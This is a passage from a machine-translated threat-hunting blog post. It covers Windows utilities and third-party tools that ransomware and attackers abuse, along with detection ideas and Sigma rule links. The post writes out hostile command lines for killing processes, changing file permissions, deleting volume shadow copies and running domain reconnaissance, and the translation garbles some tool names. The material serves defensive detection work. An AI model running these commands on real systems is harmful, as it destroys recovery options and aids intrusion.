id="3c51" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">两个最常见的命令行参数是:</p><ul class=""><li id="29f1" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><strong class="kf ir"> /im : </strong>指定要终止的进程的图像名。使用通配符(<code class="fe os ot ou nw b">*</code>)指定所有图像名称。</li><li id="4018" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /f : </strong>指定强制结束进程。对于远程进程，此参数被忽略；所有远程进程都被强制结束。</li></ul><p id="ba78" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，恶意软件经常执行的命令行如下:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="682a" class="oa lv iq nw b gy ob oc l od oe">taskkill /im [Executable] /f</span></pre><h2 id="5438" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="d0e0" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">来自CK 的<strong class="kf ir">米特ATT &amp;的以下技术与该工具相关</strong></p><ul class=""><li id="33b5" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1562/001/" rel="noopener ugc nofollow" target="_blank"> T1562.001 —削弱防御:禁用或修改工具</a></li></ul><h2 id="5bf0" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="8181" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="c925" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml" rel="noopener ugc nofollow" target="_blank">win _ multiple _ suspective _ CLI . yml</a></li><li id="60ac" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/joesecurity/sigma-rules/blob/master/rules/killmultipleprocess.yml" rel="noopener ugc nofollow" target="_blank">killmultipleprocess . yml</a></li></ul><h1 id="fb75" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">国际会计师联合会(icacls.exe)</h1><blockquote class="mx my mz"><p id="12ea" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">显示或修改指定文件的自由访问控制列表(dacl ),并将存储的dacl应用于指定目录中的文件。——<a class="ae kc" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls" rel="noopener ugc nofollow" target="_blank">MSDN</a></p></blockquote><p id="cad1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">通常被恶意软件和勒索软件用来更改和修改目录和文件权限。</p><p id="7c79" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">要么在勒索软件的情况下授予对文件和文件夹的完全权限，这通常是启动加密操作之前的最后步骤之一。或者通过删除对文件夹或文件的所有访问来创建持久性。</p><p id="e8af" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以下是最常见的参数及其含义:</p><ul class=""><li id="23d5" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><strong class="kf ir"> /T : </strong>遍历所有子文件夹，匹配文件/目录。</li><li id="aad5" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /C : </strong>继续上档错误。</li><li id="0c9d" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /L : </strong>对符号链接本身执行操作，而不是它的目标。</li><li id="0d98" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /Q : </strong>安静抑制成功消息。</li><li id="90a2" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir">/授予用户:权限:</strong>授予访问权限</li><li id="0190" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> /deny user:permission : </strong>明确拒绝指定用户的访问权限。</li><li id="0bb0" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><strong class="kf ir"> ":F "(完全访问)/" R "(只读)</strong></li></ul><p id="503a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">以下是恶意软件如何利用这一点的几个例子:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="7608" class="oa lv iq nw b gy ob oc l od oe">icacls [Disk Partition]:\* /grant Everyone:F /T /C /Q</span><span id="b918" class="oa lv iq nw b gy oq oc l od oe">icacls [Path To File/Folder] /deny *S-1-1-0:R</span><span id="6729" class="oa lv iq nw b gy oq oc l od oe">icacls [Path to Folder/File] /inheritance:e /deny "SYSTEM:(R,REA,RA,RD)"</span><span id="fef2" class="oa lv iq nw b gy oq oc l od oe">icacls [Path To File/Folder] /deny *S-1-1-0:(OI)(CI)(DE,DC)</span></pre><h2 id="5a90" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="d969" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">来自CK 的<strong class="kf ir">米特ATT &amp;的以下技术与该工具相关</strong></p><ul class=""><li id="0e34" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1222/001/" rel="noopener ugc nofollow" target="_blank"> T1222.001 —文件和目录权限修改:Windows文件和目录权限修改</a></li></ul><h2 id="92e8" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="a9a9" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="6cf0" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_multiple_suspicious_cli.yml" rel="noopener ugc nofollow" target="_blank">win _ multiple _ suspective _ CLI . yml</a></li><li id="eaa4" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_file_permission_modifications.yml" rel="noopener ugc nofollow" target="_blank">win _ file _ permission _ modifies . yml</a></li></ul><h1 id="0c46" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">vssadmin(vssadmin.exe)</h1><blockquote class="mx my mz"><p id="6ea0" class="kd ke lt kf b kg kh ki kj kk kl km kn na kp kq kr nb kt ku kv nc kx ky kz la ij bi translated">显示当前卷影副本备份和所有已安装的卷影副本编写器和提供程序— <a class="ae kc" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin" rel="noopener ugc nofollow" target="_blank"> MSDN </a></p></blockquote><p id="229e" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">勒索软件经常使用该工具从计算机中删除磁盘卷影副本，以防止任何恢复。最常见的命令行参数如下:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="1c52" class="oa lv iq nw b gy ob oc l od oe">vssadmin delete shadows</span><span id="73f9" class="oa lv iq nw b gy oq oc l od oe">vssadmin delete shadows /all</span><span id="20da" class="oa lv iq nw b gy oq oc l od oe">vssadmin delete shadows /all /quiet</span><span id="76f2" class="oa lv iq nw b gy oq oc l od oe">vssadmin resize shadowstorage</span></pre><h2 id="5bfe" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">相关的斜接技术</h2><p id="65f4" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">以下来自<strong class="kf ir">米特ATT &amp; CK </strong>的技术与该工具相关</p><ul class=""><li id="61f1" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://attack.mitre.org/techniques/T1490/" rel="noopener ugc nofollow" target="_blank"> T1490 —抑制系统恢复</a></li></ul><h2 id="e2c1" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">西格玛规则</h2><p id="0cd9" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">您可以使用以下sigma规则来检测该工具:</p><ul class=""><li id="3539" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_shadow_copies_deletion.yml" rel="noopener ugc nofollow" target="_blank">win _ shadow _ copies _ deletion . yml</a></li></ul></div><div class="ab cl ov ow hu ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="ij ik il im in"><h1 id="a838" class="lu lv iq bd lw lx pc lz ma mb pd md me mf pe mh mi mj pf ml mm mn pg mp mq mr bi translated">开源/第三方工具</h1><p id="6bdd" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">除了windows二进制文件，攻击者还使用一些开源/第三方工具来执行他们的攻击。以下是攻击者使用的一些工具</p><ul class=""><li id="398d" class="nd ne iq kf b kg kh kk kl ko nf ks ng kw nh la ni nj nk nl bi translated"><a class="ae kc" href="https://www.joeware.net/freetools/tools/adfind/" rel="noopener ugc nofollow" target="_blank"> AdFind </a></li><li id="572d" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump" rel="noopener ugc nofollow" target="_blank"> ProcDump </a></li><li id="4e38" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec" rel="noopener ugc nofollow" target="_blank"> PsExec </a></li><li id="220c" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/BloodHoundAD/BloodHound" rel="noopener ugc nofollow" target="_blank">警犬</a></li><li id="416a" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/AlessandroZ/LaZagne" rel="noopener ugc nofollow" target="_blank"> LaZagne </a></li><li id="b8e0" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.sordum.org/9480/defender-control-v1-6/" rel="noopener ugc nofollow" target="_blank">后卫控制</a></li><li id="7cd7" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.advanced-ip-scanner.com/" rel="noopener ugc nofollow" target="_blank">高级IP扫描仪</a></li><li id="bd80" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.nirsoft.net/password_recovery_tools.html" rel="noopener ugc nofollow" target="_blank"> NirSoft密码恢复工具</a></li><li id="7dca" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.powershellempire.com/" rel="noopener ugc nofollow" target="_blank"> PowerShell帝国</a></li><li id="6285" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/PowerShellMafia/PowerSploit" rel="noopener ugc nofollow" target="_blank"> PowerSploit </a></li><li id="b6ee" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">米米卡兹</li><li id="08f5" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.cobaltstrike.com/" rel="noopener ugc nofollow" target="_blank">钴击</a></li><li id="36cf" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://github.com/SecureAuthCorp/impacket" rel="noopener ugc nofollow" target="_blank">撞击</a></li></ul></div><div class="ab cl ov ow hu ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="ij ik il im in"><p id="f8bc" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kf ir">注意:</strong>这绝不是一个详尽的列表，这些是我在阅读这些博客帖子和查看沙盒报告时发现的最常见的工具。</p><p id="bace" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">你会注意到我省略了PowerShell、WScript、Regsvr32、Dllhost…等实用程序。这些仍然非常普遍，并在攻击中使用。我希望你这位读者能有足够的兴趣去查阅我下面链接的一些资源，做更多的研究。</p></div><div class="ab cl ov ow hu ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="ij ik il im in"><h1 id="ff99" class="lu lv iq bd lw lx pc lz ma mb pd md me mf pe mh mi mj pf ml mm mn pg mp mq mr bi translated">探测/威胁搜寻机会</h1><p id="9cf1" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">既然我们已经熟悉了恶意软件和威胁参与者使用的一些实用程序，那么您将会想要开始编写规则或使用开源规则来检测它们。无论你是设计一个检测还是寻找一个威胁，这些都是你应该寻找并牢记在心的。</p><h2 id="7d54" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">为您的环境设定基准</h2><p id="bb9f" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">在开始编写规则和触发警报之前，您需要记住，现有的大多数规则并不是针对特定环境而设计的，而是针对特定威胁或技术而设计的。这意味着当你写或实现一个规则时，不要只看表面价值。始终通过为环境中的用户行为设定基线来使其适应您的环境。我们都有一个拥有“最伟大”想法的管理者。</p><h2 id="42ec" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">注册表项修改/创建</h2><p id="15b4" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">出于多种原因，大多数恶意软件和威胁参与者(如果不是全部的话)都会以某种形式与注册表进行交互。</p><p id="047a" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">一个好主意是通过创建规则来监视具有不同威胁分值的特定注册表项，从而始终关注注册表项的交互。</p><p id="cfab" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">即使您负担不起对不同注册表项进行研究的费用。互联网上充斥着描述当前恶意软件和威胁行为者正在使用的博客帖子和研究。</p><h2 id="b255" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">连续执行</h2><p id="881c" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">本博客中提到的大多数工具都是管理员和脚本在某些环境中日常使用的。如果你写了一个规则，每次被使用时触发，你会陷入一个错误的夜晚。</p><p id="cf7b" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">对于这样的实用程序，总是要考虑执行之间的时间间隔。以下面的例子为例:</p><pre class="nr ns nt nu gt nv nw nx ny aw nz bi"><span id="d606" class="oa lv iq nw b gy ob oc l od oe">whoami &amp; hostname &amp; ipconfig /all &amp; net user /domain 2&gt;&amp;1 &amp; net group /domain 2&gt;&amp;1 &amp; net group “domain admins” /domain 2&gt;&amp;1 &amp; net group “Exchange Trusted Subsystem” /domain 2&gt;&amp;1 &amp; net accounts /domain 2&gt;&amp;1 &amp; net user 2&gt;&amp;1 &amp; net localgroup administrators 2&gt;&amp;1 &amp; netstat -an 2&gt;&amp;1 &amp; tasklist 2&gt;&amp;1 &amp; sc query 2&gt;&amp;1 &amp; systeminfo 2&gt;&amp;1 &amp; reg query “HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default” 2&gt;&amp;1</span></pre><p id="f437" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">正在运行<strong class="kf ir"><em class="lt">【whoami】</em></strong><strong class="kf ir"><em class="lt">【主机名】</em></strong><strong class="kf ir"><em class="lt">【ipconfig/all】</em></strong><strong class="kf ir"><em class="lt">【网络用户/域】</em></strong>……等等。连续的可能性很小。</p><h2 id="d74d" class="oa lv iq bd lw of og dn ma oh oi dp me ko oj ok mi ks ol om mm kw on oo mq op bi translated">命令行参数</h2><p id="aef0" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">这篇博文的全部目的是让非初学者(包括我自己)熟悉近年来恶意软件使用的工具和命令行参数。所以如果你从这里拿走任何东西</p><blockquote class="ph"><p id="561a" class="pi pj iq bd pk pl pm pn po pp pq la dk translated"><strong class="ak">始终调查进程的命令行</strong></p></blockquote><h2 id="3bab" class="oa lv iq bd lw of pr dn ma oh ps dp me ko pt ok mi ks pu om mm kw pv oo mq op bi translated">不寻常的子女/父母关系</h2><p id="31e2" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">威胁参与者或恶意软件在执行之前需要做的第一件事是到达其目标，为此需要一个入口点。</p><p id="0e77" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">不管是电子邮件附件还是其他什么。恶意软件需要欺骗用户(除了不需要用户交互的漏洞之外)来执行某些操作。</p><p id="f348" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">因此，在某个时间点，我们会有一个<strong class="kf ir">“合法”</strong>进程，如<strong class="kf ir">“word . exe”</strong>，产生另一个进程，该进程将执行恶意代码，如<strong class="kf ir">“powershell . exe”。</strong><strong class="kf ir">“合法”</strong>子进程的概念需要一些你要对付的操作系统的知识，以及捕捉邪恶所需的知识。</p></div><div class="ab cl ov ow hu ox" role="separator"><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa pb"/><span class="oy bw bk oz pa"/></div><div class="ij ik il im in"><h1 id="5b75" class="lu lv iq bd lw lx pc lz ma mb pd md me mf pe mh mi mj pf ml mm mn pg mp mq mr bi translated">结论</h1><p id="5231" class="pw-post-body-paragraph kd ke iq kf b kg ms ki kj kk mt km kn ko mu kq kr ks mv ku kv kw mw ky kz la ij bi translated">在第一部分中，我们已经了解了近年来恶意软件使用的一些最常见的windows实用程序和开源工具。我们还介绍了一些探测和狩猎的想法。</p><p id="12e1" class="pw-post-body-paragraph kd ke iq kf b kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">感谢阅读。如果你对此有任何问题或补充，请在twitter上打我<a class="ae kc" href="https://twitter.com/nas_bench" rel="noopener ugc nofollow" target="_blank"> <strong class="kf ir"> @nas_bench </strong> </a></p><div class="lb lc gp gr ld le"><a href="https://www.buymeacoffee.com/nasbench" rel="noopener  ugc nofollow" target="_blank"><div class="lf ab fo"><div class="lg ab lh cl cj li"><h2 class="bd ir gy z fp lj fr fs lk fu fw ip bi translated">Nasreddine Bencherchali正在创建关于威胁追踪和检测工程的Infosec博客</h2><div class="ll l"><h3 class="bd b gy z fp lj fr fs lk fu fw dk translated">热心的学习者。对所有事情都充满热情#恶意软件# DFIR # Python #威胁狩猎并热爱#WindowsInternals</h3></div><div class="lm l"><p class="bd b dl z fp lj fr fs lk fu fw dk translated">www.buymeacoffee.com</p></div></div><div class="ln l"><div class="pw l lp lq lr ln ls jw le"/></div></div></a></div><h1 id="3103" class="lu lv iq bd lw lx ly lz ma mb mc md me mf mg mh mi mj mk ml mm mn mo mp mq mr bi translated">资源</h1><ul class=""><li id="5c14" class="nd ne iq kf b kg ms kk mt ko px ks py kw pz la ni nj nk nl bi translated"><a class="ae kc" href="https://thedfirreport.com/" rel="noopener ugc nofollow" target="_blank">https://thedfirreport.com/</a></li><li id="9c65" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">https://redcanary.com/blog/<a class="ae kc" href="https://redcanary.com/blog/" rel="noopener ugc nofollow" target="_blank"/></li><li id="444b" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated">【https://attack.mitre.org/ T4】</li><li id="7ca8" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.fireeye.com/blog.html" rel="noopener ugc nofollow" target="_blank">https://www.fireeye.com/blog.html</a></li><li id="5dba" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://research.checkpoint.com/" rel="noopener ugc nofollow" target="_blank">https://research.checkpoint.com/</a></li><li id="080b" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://lolbas-project.github.io/" rel="noopener ugc nofollow" target="_blank">https://lolbas-project.github.io/</a></li><li id="ca10" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://docs.microsoft.com/en-us/" rel="noopener ugc nofollow" target="_blank">https://docs.microsoft.com/en-us/</a></li><li id="1566" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://any.run/" rel="noopener ugc nofollow" target="_blank">https://any.run/</a></li><li id="307a" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="http://tria.ge/" rel="noopener ugc nofollow" target="_blank">http://tria.ge/</a></li><li id="0146" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.hybrid-analysis.com/" rel="noopener ugc nofollow" target="_blank">https://www.hybrid-analysis.com/</a></li><li id="ada3" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://cyberpolygon.com/materials/" rel="noopener ugc nofollow" target="_blank">https://cyberpolygon.com/materials/</a></li><li id="5a94" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.crowdstrike.com/blog/" rel="noopener ugc nofollow" target="_blank">https://www.crowdstrike.com/blog/</a></li><li id="870b" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://labs.inquest.net/" rel="noopener ugc nofollow" target="_blank">https://labs.inquest.net/</a></li><li id="fd6b" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://symantec-enterprise-blogs.security.com/blogs/" rel="noopener ugc nofollow" target="_blank">https://symantec-enterprise-blogs.security.com/blogs/</a></li><li id="5606" class="nd ne iq kf b kg nm kk nn ko no ks np kw nq la ni nj nk nl bi translated"><a class="ae kc" href="https://www.microsoft.com/security/blog/" rel="noopener ugc nofollow" target="_blank">https://www.microsoft.com/security/blog/</a></li></ul></div></div>    
</body>
</html>